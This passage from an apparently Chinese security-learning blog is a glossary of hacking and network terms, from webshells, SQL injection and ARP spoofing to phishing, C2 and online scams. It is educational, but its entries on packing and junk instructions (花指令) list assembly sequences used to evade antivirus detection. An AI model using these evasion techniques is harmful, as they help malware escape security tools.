title="webshell"></a>webshell</h3><blockquote><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门。</p><p>黑客在hack了一个网站后，通常会将这些asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起。</p><p>之后就可以使用浏览器来访问这些asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。可以上传下载文件，查看数据库，执行任意程序命令等。国内常用的webshell有海阳ASP木马，Phpspy，c99shell等。</p></blockquote><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><blockquote><p>确切的讲，应该是“缓冲区溢出”。</p><p>简单的解释就是程序对接受的输入数据没有执行有效的检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。</p><p>大致可以分为两类：（1）堆溢出（2）栈溢出。</p></blockquote><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><blockquote><p>用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想要知道的数据，这个就是所谓的SQLinjection，即：SQL恶意注入。</p></blockquote><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><blockquote><p>以实行注入的地方，通常是一个访问数据库的连接。</p><p>根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同。</p></blockquote><h3 id="旁站入侵"><a href="#旁站入侵" class="headerlink" title="旁站入侵"></a>旁站入侵</h3><blockquote><p>同一个服务器上有多个站点，可以通过入侵其中一个站点，通过提权跨目录访问其他站点。</p></blockquote><h3 id="C段渗透"><a href="#C段渗透" class="headerlink" title="C段渗透"></a>C段渗透</h3><blockquote><p>C段下服务器入侵同一个网段内</p><p>例如 202.202.0.1-2020.0.254如果拿下其中一台服务器，通过这台服务器嗅探目标服务器传输上的数据。从而获取这台服务器的权限。常见的工具有cain。</p></blockquote><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><blockquote><p>通俗的讲就是局域网，比如网吧，校园网，公司内部网等都属于此类。</p><p>查看IP地址如果是在以下三个范围之内的话，就说明我们是处于内网之中的：10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255</p></blockquote><h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h3><blockquote><p>直接连入INTERNET（互连网），可以与互连网上的任意一台电脑互相访问，IP地址不是保留IP（内网）IP地址。</p></blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><blockquote><p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）中间人攻击很早就成为了黑客常用的一种古老的攻击手段，并且一直到如今还具有极大的扩展空间。在网络安全方面，MITM攻击的使用是很广泛的，曾经猖獗一时的SMB会话劫持、DNS欺骗等技术都是典型的MITM攻击手段。在黑客技术越来越多的运用于以获取经济利益为目标的情况下时，MITM攻击成为对网银、网游、网上交易等最有威胁并且最具破坏性的一种攻击方式。</p></blockquote><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><blockquote><p>（Port）相当于一种数据的传输通道。用于接受某些数据，然后传输给相应的服务，而电脑将这些数据处理后，再将相应的恢复通过开启的端口传给对方。一般每一个端口的开放的偶对应了相应的服务，要关闭这些端口只需要将对应的服务关闭就可以了</p></blockquote><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><blockquote><p>就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。</p></blockquote><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><blockquote><p>就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。</p></blockquote><h3 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h3><blockquote><p>就是几句汇编指令，让汇编语句进行一些跳转，使得杀毒软件不能正常的判断病毒文件的构造。</p><p>说通俗点就是”杀毒软件是从头到脚按顺序来查找病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了“。</p></blockquote><ul><li>push ebp —-把基址指针寄存器压入堆栈</li><li>pop  ebp —-把基址指针寄存器弹出堆栈</li><li>push eax —-把数据寄存器压入堆栈</li><li>pop  eax —-把数据寄存器弹出堆栈</li><li>nop    —–不执行</li><li>add esp,1—–指针寄存器加1</li><li>sub esp,-1—–指针寄存器加1</li><li>add esp,-1——–指针寄存器减1</li><li>sub esp,1—–指针寄存器减1</li><li>inc ecx  —–计数器加1</li><li>dec ecx  —–计数器减1</li><li>sub esp,1 —-指针寄存器-1</li><li>sub esp,-1—-指针寄存器加1</li><li>jmp 入口地址—-跳到程序入口地址</li><li>push 入口地址—把入口地址压入堆栈</li><li>retn    —— 反回到入口地址,效果与jmp入口地址一样.</li><li>mov eax,入口地址——把入口地址转送到数据寄存器中.</li><li>jmp eax    —– 跳到程序入口地址</li><li>jb 入口地址</li><li>jnb 入口地址  ——效果和jmp入口地址一样,直接</li></ul><h3 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h3><blockquote><p>是一种网络通信协议，他规范了网络上所有的通信设备，尤其是一个主机与另一个主机之间的数据往来格式以及传送方式.，TCP/IP是INTERNET的基础协议，也是一种电脑数据打包和寻址的标准方法.</p><p>在数据传送中，可以形象地理解为两个信封，TCP和IP就像是信封，要传递的信息被划为若干段，每一段塞入一个TCP信封，并在该信封面上记录有分段号的信息，再将TCP信封塞入IP大信封，发送上网.。</p></blockquote><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><blockquote><p>应该是在网络上使用最高的设备之一了，它的主要作用就是路由选择，将IP数据报正确的送到目的地，因此也叫IP路由器.</p></blockquote><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><blockquote><p>好比是情报收集系统。蜜罐好象是故意让人攻击的目标，引诱黑客来攻击，所以攻击者攻击后，你就可以知道他是如何得逞的，随时了解针对你的服务器发动的最新的攻击和漏洞.还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络.。</p></blockquote><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><blockquote><p>拒绝服务攻击 DOS是DENIALOFSERVICE的简称，即拒绝服务，造成DOS的攻击行为被称为DOS攻击，其目的是使计算机或网络无法正常服务。</p><p>最常见的DOS攻击有计算机网络宽带攻击和连通性攻击，连通性攻击指用大量的连接请求冲击计算机，使得所有可用的操作系统资源被消耗，最终计算机无法再处理合法用户的请求.。</p></blockquote><h3 id="cc攻击"><a href="#cc攻击" class="headerlink" title="cc攻击"></a>cc攻击</h3><blockquote><p>攻击者借助代理服务器生成指向受害主机的合法请求，实现DDOS和伪装就叫：CC(ChallengeCollapsar)。</p></blockquote><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><blockquote><p>把SQL命令插入到WEB表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。</p><p>在某些表单中，用户输入的内容直接用来构造动态的SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击</p></blockquote><h3 id="加密技术"><a href="#加密技术" class="headerlink" title="加密技术"></a>加密技术</h3><blockquote><p>利用技术手段把重要的数据变为乱码（加密）传送，到达目的地后再用相同或不同的手段还原（解密）。加密技术包括两个元素：算法和密钥。算法是将普通的信息或者可以理解的信息与一串数字（密钥）结合，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解密的一种算法。在安全保密中，可通过适当的钥加密技术和管理机制来保证网络的信息通信安全。</p></blockquote><h3 id="局域网内部ARP攻击"><a href="#局域网内部ARP攻击" class="headerlink" title="局域网内部ARP攻击"></a>局域网内部ARP攻击</h3><blockquote><p>ARP（AddressResolutionProtocol，地址解析协议）协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p><p>基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。一般情况下，受到ARP攻击的计算机会出现两种现象：</p><p>1.不断弹出“本机的XXX段硬件地址与网络中的XXX段地址冲突”的对话框。</p><p>2.计算机不能正常上网，出现网络中断的症状。</p><p>因为这种攻击是利用ARP请求报文进行“欺骗”的，所以防火墙会误以为是正常的请求数据包，不予拦截。因此普通的防火墙很难抵挡这种攻击。</p></blockquote><h3 id="什么叫欺骗攻击？他有哪些攻击方式？"><a href="#什么叫欺骗攻击？他有哪些攻击方式？" class="headerlink" title="什么叫欺骗攻击？他有哪些攻击方式？"></a>什么叫欺骗攻击？他有哪些攻击方式？</h3><blockquote><p>网络欺骗的技术主要有：HONEYPOT和分布式HONEYPOT、欺骗空间技术等。主要方式有：IP欺骗、ARP欺骗、DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。</p></blockquote><h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h3><blockquote><p>就是窃听网络上流经的数据包，而数据包里面一般会包含很多重要的私隐信息，</p></blockquote><h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h3><blockquote><p>一个具有辅助作用的机器，利用这个主机作为一个间接工具，控制其他主机，一般和肉鸡连用。</p></blockquote><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><blockquote><p>计算机用户对于文件及目录的建立，修改，删除以及对于某些服务的访问，程序的执行，是以权限的形式来严格区分的。被赋予了相应的权限，就可以进行相应的操作，否则就不可以。</p></blockquote><h3 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h3><blockquote><p>internet上的电脑有许多，为了让他们能够相互识别，internet上的每一台主机都分配有一个唯一的32位地址，该地址称为ip地址，也称作网际地址，ip地址由4个数值部分组成，每个数值部分可取值0-255，各部分之间用一个‘.‘分开.</p></blockquote><h3 id="RARP反向地址解析协议"><a href="#RARP反向地址解析协议" class="headerlink" title="RARP反向地址解析协议"></a>RARP反向地址解析协议</h3><blockquote><p>RARP反向地址解析协议(ReverseAddressResolutionProtocol)，</p><p>此协议将硬件地址映射到网络地址。</p></blockquote><h3 id="UDP用户数据报协议"><a href="#UDP用户数据报协议" class="headerlink" title="UDP用户数据报协议"></a>UDP用户数据报协议</h3><blockquote><p>UDP是UserDatagram Protocol的简称，中文名是用户数据报协议。</p><p>是OSI（OpenSystem Interconnection，开放式系统互联）参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p></blockquote><h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><blockquote><p>传输控制协议（TCP，TransmissionControl Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议。</p></blockquote><p>三次握手：</p><p><img src="/2021/07/15/60-zhi-day11-1/image-20210716111822717.png" alt="image-20210716111822717"></p><p>四次挥手：</p><p><img src="/2021/07/15/60-zhi-day11-1/image-20210716111809022.png" alt="image-20210716111809022"></p><h3 id="FTP文件传输协议"><a href="#FTP文件传输协议" class="headerlink" title="FTP文件传输协议"></a>FTP文件传输协议</h3><blockquote><p>文件传输协议(FileTransferProtocol)，允许用户以文件操作的方式（文件的增、删、改、查、传送等）与另一主机相互通信。</p></blockquote><h3 id="SMTP简单邮件传送协议"><a href="#SMTP简单邮件传送协议" class="headerlink" title="SMTP简单邮件传送协议"></a>SMTP简单邮件传送协议</h3><blockquote><p>简单邮件传送协议(SimpleMailTransferProtocol)，SMTP协议为系统之间传送电子邮件。</p></blockquote><h3 id="TELENT终端协议"><a href="#TELENT终端协议" class="headerlink" title="TELENT终端协议"></a>TELENT终端协议</h3><blockquote><p>终端协议(TelTerminalProcotol)，允许用户以虚终端方式访问远程主机。</p></blockquote><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><blockquote><p>超文本传输协议（HypertextTransferProtocol，HTTP）是一个简单的请求-响应协议，它通常运行在TCP之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应。</p></blockquote><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><blockquote><p>HTTPS：安全超文本传输协议。通过在安全套接字层（SSL）协议上运行超文本传输协议来将安全添加到万维网中。HTTPS能用于将WEB服务器认证到客户，将客户认证到WEB服务器和加密在两个系统之间传输的所有数据，HTTPS服务器一般监听TCP端口443。</p></blockquote><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><blockquote><p>简单文件传输协议(TrivialFileTransferProtocol)</p></blockquote><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><blockquote><p>ICMP（全称是InterControlMessageProtocol，即Inter控制消息协议）用于在IP主机、路由器之间传递控制消息，包括网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p><p>例如，我们在检测网络通不通时常会使用Ping命令，Ping执行操作的过程就是ICMP协议工作的过程。“ICMP协议”对于网络安全有着极其重要的意义，其本身的特性决定了它非常容易被用于攻击网络上的路由器和主机。</p><p>例如，曾经轰动一时的海信主页被黑事件就是以ICMP攻击为主的。由于操作系统规定ICMP数据包最大尺寸不超过64KB，因而如果向目标主机发送超过64KB上限的数据包，该主机就会出现内存分配错误，进而导致系统耗费大量的资源处理，疲于奔命，最终瘫痪、死机。</p></blockquote><h3 id="dns协议"><a href="#dns协议" class="headerlink" title="dns协议"></a>dns协议</h3><blockquote><p>DNS协议就是用来将域名解析到IP地址的一种协议，当然，也可以将IP地址转换为域名的一种协议。</p></blockquote><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><blockquote><p>Unix里最高权限的用户，也就是超级管理员。</p></blockquote><h3 id="EXP-Exploit"><a href="#EXP-Exploit" class="headerlink" title="EXP/Exploit"></a>EXP/Exploit</h3><blockquote><p>漏洞利用代码，运行之后对目标进行攻击。</p></blockquote><h3 id="POC-Proff-of-Concept"><a href="#POC-Proff-of-Concept" class="headerlink" title="POC / Proff of Concept"></a>POC / Proff of Concept</h3><blockquote><p>漏洞验证代码，检测目标是否存在对应漏洞</p></blockquote><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><blockquote><p>指成功exploit之后，真正在目标系统执行的代码或指令。</p></blockquote><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><blockquote><p>是Payload的一种，由于其建立正向/反向shell而得名。</p></blockquote><h3 id="软件加壳"><a href="#软件加壳" class="headerlink" title="软件加壳"></a>软件加壳</h3><blockquote><p>“壳”是一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。</p><p>经过加壳的软件在跟踪时已看到其真实的十六进制代码，因此可以起到保护软件的目的。</p></blockquote><h3 id="软件脱壳"><a href="#软件脱壳" class="headerlink" title="软件脱壳"></a>软件脱壳</h3><blockquote><p>顾名思义，就是利用相应的工具，把在软件“外面”起保护作用的“壳”程序去除，还文件本来面目，这样再修改文件内容就容易多了。</p></blockquote><h3 id="蠕虫病毒"><a href="#蠕虫病毒" class="headerlink" title="蠕虫病毒"></a>蠕虫病毒</h3><blockquote><p>它利用了WINDOWS系统的开放性特点，特别是COM到COM+的组件编程思路，一个脚本程序能调用功能更大的组件来完成自己的功能。以VB脚本病毒为例，它们都是把VBS脚本文件加在附件中，使用*.HTM，VBS等欺骗性的文件名。</p><p>蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性。</p></blockquote><h3 id="LAN"><a href="#LAN" class="headerlink" title="LAN"></a>LAN</h3><blockquote><p>局域网！一种网络，连接近距离的计算机，一般位于单个房间、建筑物或小的地理区域里。LAN上的所有系统位于一个网络跳之间。</p></blockquote><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><blockquote><p>代理。一类程序或系统，接收来自客户机算计的流量，并代表客户与服务器交互。代理能用于过滤应用级别的制定类型的流量或缓存信息以提高性能。许多防火墙依赖代理进行过滤。</p></blockquote><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><blockquote><p>超文本标记语言（英语：HyperTextMarkup Language，简称：HTML）是一种用于创建网页的标准标记语言。</p><p>您可以使用HTML 来建立自己的WEB 站点，HTML运行在浏览器上，由浏览器来解析。</p></blockquote><h3 id="css层叠样式表"><a href="#css层叠样式表" class="headerlink" title="css层叠样式表"></a>css层叠样式表</h3><blockquote><p>层叠样式表(英文全称：CascadingStyleSheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。</p><p>CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p></blockquote><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><blockquote><p>是一种属于网络的高级脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。</p><p>通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的。</p></blockquote><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><blockquote><p>CMS是ContentManagement System的缩写，意为”内容管理系统”。</p></blockquote><h3 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h3><blockquote><p>独立服务器整体硬件都是独立的，性能强大，特别是CPU，被认为是性能最佳的托管选项之一。使用真实存在的独立服务器就像拥有自己的房子，没有人打扰，可以部署任何想要的东西。</p></blockquote><h3 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h3><blockquote><p>VPS主机是一项服务器虚拟化和自动化技术，它采用的是操作系统虚拟化技术。</p><p>操作系统虚拟化的概念是基于共用操作系统内核，这样虚拟服务器就无需额外的虚拟化内核的过程，因而虚拟过程资源损耗就更低，从而可以在一台物理服务器上实现更多的虚拟化服务器。这些VPS主机以最大化的效率共享硬件、软件许可证以及管理资源。</p><p>每一个VPS主机均可独立进行重启，并拥有自己的root访问权限、用户、IP地址、内存、过程、文件、应用程序、系统函数库以及配置文件。</p></blockquote><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><blockquote><p>域名（英语：DomainName），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）</p></blockquote><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><blockquote><p>CTF（CaptureThe Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。</p></blockquote><h3 id="awd攻防对抗赛"><a href="#awd攻防对抗赛" class="headerlink" title="awd攻防对抗赛"></a>awd攻防对抗赛</h3><blockquote><p>AWD(AttackWithDefense，攻防兼备)模式是一个非常有意思的模式，你需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分。也就是说，攻击别人的靶机可以获取Flag分数时，别人会被扣分，同时你也要保护自己的主机不被别人得分，以防扣分。</p></blockquote><h3 id="cve"><a href="#cve" class="headerlink" title="cve"></a>cve</h3><blockquote><p>CVE的英文全称是“CommonVulnerabilities &amp; Exposures”通用漏洞披露。</p></blockquote><h3 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a>CNVD</h3><blockquote><p>国家信息安全漏洞共享平台，简称CNVD，国家计算机网络应急技术处理协调中心联合建立的信息安全漏洞信息共享知识库。</p><p>主要目标提升我国在安全漏洞方面的整体研究水平和及时预防能力，带动国内相关安全产品的发展。</p></blockquote><h3 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h3><blockquote><p>dvancedPersistentThreat，高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的供给形式（极强的隐蔽性、潜伏期长，持续性强、目标性强）</p></blockquote><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><blockquote><p>渗透测试：黑盒测试、白盒测试、灰盒测试</p></blockquote><h3 id="暗网"><a href="#暗网" class="headerlink" title="暗网"></a>暗网</h3><blockquote><p>“暗网”是指隐藏的网络，普通网民无法通过常规手段搜索访问，需要使用一些特定的软件、配置或者授权等才能登录。</p><p>一般用tor洋葱浏览器进入。暗网是利用加密传输、P2P对等网络、多点中继混淆等，为用户提供匿名的互联网信息访问的一类技术手段，其最突出的特点就是匿名性。</p></blockquote><h3 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h3><blockquote><p>被设计来达到非授权控制计算机或窃取计算机数据等多种恶意行为的程序。</p></blockquote><h3 id="间谍软件"><a href="#间谍软件" class="headerlink" title="间谍软件"></a>间谍软件</h3><blockquote><p>一种能够在用户不知情的情况下，在其电脑、手机上安装后门，具备收集用户信息、监听、偷拍等功能的软件。</p></blockquote><h3 id="洪水攻击"><a href="#洪水攻击" class="headerlink" title="洪水攻击"></a>洪水攻击</h3><blockquote><p>是黑客比较常用的一种攻击技术，特点是<strong>实施简单，威力巨大</strong>，大多是无视防御的。</p><p>从定义上说，攻击者对网络资源发送过量数据时就发生了洪水攻击，这个网络资源可以是router，switch，host，application等。</p><p>洪水攻击将攻击流量比作成洪水，只要攻击流量足够大，就可以将防御手段打穿。DDoS攻击便是洪水攻击的一种。</p></blockquote><h3 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h3><blockquote><p>利用操作系统TCP协议设计上的问题执行的拒绝服务攻击，涉及TCP建立连接时三次握手的设计。</p></blockquote><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><blockquote><p>拒绝服务攻击。攻击者通过<strong>利用漏洞或发送大量的请求</strong>导致攻击对象无法访问网络或者网站无法被访问。</p></blockquote><h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h3><blockquote><p>分布式DOS攻击，常见的UDP、SYN、反射放大攻击等等，就是<strong>通过许多台肉鸡一起向你发送一些网络请求信息</strong>，导致你的网络堵塞而不能正常上网。</p></blockquote><h3 id="抓鸡"><a href="#抓鸡" class="headerlink" title="抓鸡"></a>抓鸡</h3><blockquote><p>即设法控制电脑，将其沦为肉鸡。</p></blockquote><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><blockquote><p>端口扫描是指发送一组端口扫描消息，通过它了解到从哪里可探寻到攻击弱点，并了解其提供的计算机网络服务类型，试图以此侵入某台计算机。</p></blockquote><h3 id="反弹端口"><a href="#反弹端口" class="headerlink" title="反弹端口"></a>反弹端口</h3><blockquote><p><strong>防火墙对于连入的连接往往会进行非常严格的过滤，但是对于连出的连接却疏于防范</strong>。</p><p>于是，利用这一特性，反弹端口型软件的服务端(被控制端)会主动连接客户端(控制端)，就给人“被控制端主动连接控制端的假象，让人麻痹大意。</p></blockquote><h3 id="鱼叉攻击"><a href="#鱼叉攻击" class="headerlink" title="鱼叉攻击"></a>鱼叉攻击</h3><blockquote><p>鱼叉攻击是将用鱼叉捕鱼形象的引入到了网络攻击中，主要是指可以使欺骗性电子邮件看起来更加可信的网络钓鱼攻击，具有更高的成功可能性。</p><p>不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往“见鱼而使叉”。</p><p>为了实现这一目标，攻击者将尝试在目标上收集尽可能多的信息。通常，组织内的特定个人存在某些安全漏洞。</p></blockquote><h3 id="钓鲸攻击"><a href="#钓鲸攻击" class="headerlink" title="钓鲸攻击"></a>钓鲸攻击</h3><blockquote><p>捕鲸是另一种进化形式的鱼叉式网络钓鱼。它指的是<strong>针对高级管理人员和组织内其他高级人员的网络钓鱼攻击</strong>。</p><p>通过使电子邮件内容具有个性化并专门针对相关目标进行定制的攻击。</p></blockquote><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h3><blockquote><p>顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。</p><p>最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</p></blockquote><h3 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h3><blockquote><p>C2全称为CommandandControl，命令与控制，常见于APT攻击场景中。作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”。</p></blockquote><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><blockquote><p>是黑客攻击目标机构的合作伙伴，并以该合作伙为跳板，达到渗透目标用户的目的。</p><p>一种常见的表现形式为，用户对厂商产品的信任，在厂商产品下载安装或者更新时进行恶意软件植入进行攻击。</p><p>所以，在某些软件下载平台下载的时候，若遭遇捆绑软件，就得小心了！</p></blockquote><h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><blockquote><p>就是通过<strong>扫描检测你的网络设备及系统有没有安全漏洞</strong>，有的话就可能被入侵，就像一滴水透过一块有漏洞的木板，渗透成功就是系统被入侵。</p></blockquote><h3 id="横移"><a href="#横移" class="headerlink" title="横移"></a>横移</h3><blockquote><p>指攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统。</p></blockquote><h3 id="暗链"><a href="#暗链" class="headerlink" title="暗链"></a>暗链</h3><blockquote><p>看不见的网站链接，“暗链”在网站中的链接做得非常隐蔽，短时间内不易被搜索引擎察觉。</p><p>它和友情链接有相似之处，可以有效地提高网站权重。</p></blockquote><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><blockquote><p>入侵网站的一种手法，通过恶意代码让网站爆出其一些敏感数据来。</p></blockquote><h3 id="薅羊毛"><a href="#薅羊毛" class="headerlink" title="薅羊毛"></a>薅羊毛</h3><blockquote><p>指网赚一族利用各种网络金融产品或红包活动推广下线抽成赚钱，又泛指搜集各个银行等金融机构及各类商家的优惠信息，以此实现盈利的目的。这类行为就被称之为薅羊毛。</p></blockquote><h3 id="商业电子邮件攻击（BEC）"><a href="#商业电子邮件攻击（BEC）" class="headerlink" title="商业电子邮件攻击（BEC）"></a>商业电子邮件攻击（BEC）</h3><blockquote><p>也被称为“变脸诈骗”攻击，这是针对高层管理人员的攻击，攻击者通常冒充（盗用）决策者的邮件，来下达与资金、利益相关的指令；或者攻击者依赖社会工程学制作电子邮件，说服/诱导高管短时间进行经济交易。</p></blockquote><h3 id="电信诈骗"><a href="#电信诈骗" class="headerlink" title="电信诈骗"></a>电信诈骗</h3><blockquote><p>是指通过电话、网络和短信方式，编造虚假信息，设置骗局，对受害人实施远程、非接触式诈骗，诱使受害人打款或转账的犯罪行为，通常以冒充他人及仿冒、伪造各种合法外衣和形式的方式达到欺骗的目的。</p></blockquote><h3 id="杀猪盘"><a href="#杀猪盘" class="headerlink" title="杀猪盘"></a>杀猪盘</h3><blockquote><p>网络流行词，电信诈骗的一种，是一种<strong>网络交友诱导股票投资、赌博等类型的诈骗方式</strong>。</p><p>“杀猪盘”则是“从业者们”自己起的名字，是指放长线“养猪”诈骗，养得越久，诈骗得越狠。</p></blockquote><h3 id="黑产"><a href="#黑产" class="headerlink" title="黑产"></a>黑产</h3><blockquote><p>网络黑产，指以互联网为媒介，以网络技术为主要手段，为计算机信息系统安全和网络空间管理秩序，甚至国家安全、社会政治稳定带来潜在威胁（重大安全隐患）的非法行为。</p><p>例如非法数据交易产业。</p></blockquote><h3 id="黑帽黑客"><a href="#黑帽黑客" class="headerlink" title="黑帽黑客"></a>黑帽黑客</h3><blockquote><p>以非法目的进行黑客攻击的人，通常是为了经济利益。他们进入安全网络以销毁、赎回、修改或窃取数据，或使网络无法用于授权用户。</p><p>这个名字来源于这样一个历史：老式的黑白西部电影中，恶棍很容易被电影观众识别，因为他们戴着黑帽子，而“好人”则戴着白帽子。</p></blockquote><h3 id="白帽黑客"><a href="#白帽黑客" class="headerlink" title="白帽黑客"></a>白帽黑客</h3><blockquote><p>是那些用自己的黑客技术来进行合法的安全测试分析的黑客，测试网络和系统的性能来判定它们能够承受入侵的强弱程度。</p></blockquote><h3 id="红帽黑客"><a href="#红帽黑客" class="headerlink" title="红帽黑客"></a>红帽黑客</h3><blockquote><p>事实上最为人所接受的说法叫红客。</p><p>红帽黑客<strong>以正义、道德、进步、强大为宗旨，以热爱祖国、坚持正义、开拓进取为精神支柱</strong>，红客通常会利用自己掌握的技术去维护国内网络的安全，并对外来的进攻进行还击。</p></blockquote><h3 id="红队"><a href="#红队" class="headerlink" title="红队"></a>红队</h3><blockquote><p>通常指攻防演习中的攻击队伍。</p></blockquote><h3 id="蓝队"><a href="#蓝队" class="headerlink" title="蓝队"></a>蓝队</h3><blockquote><p>通常指攻防演习中的防守队伍。</p></blockquote><h3 id="紫队"><a href="#紫队" class="headerlink" title="紫队"></a>紫队</h3><blockquote><p>攻防演习中新近诞生的一方，通常指监理方或者裁判方。</p></blockquote><h3 id="加密机"><a href="#加密机" class="headerlink" title="加密机"></a>加密机</h3><blockquote><p>主机加密设备，加密机和主机之间使用TCP/IP协议通信，所以<strong>加密机对主机的类型和主机操作系统无任何特殊的要求</strong>。</p></blockquote><h3 id="CA证书"><a href="#CA证书" class="headerlink" 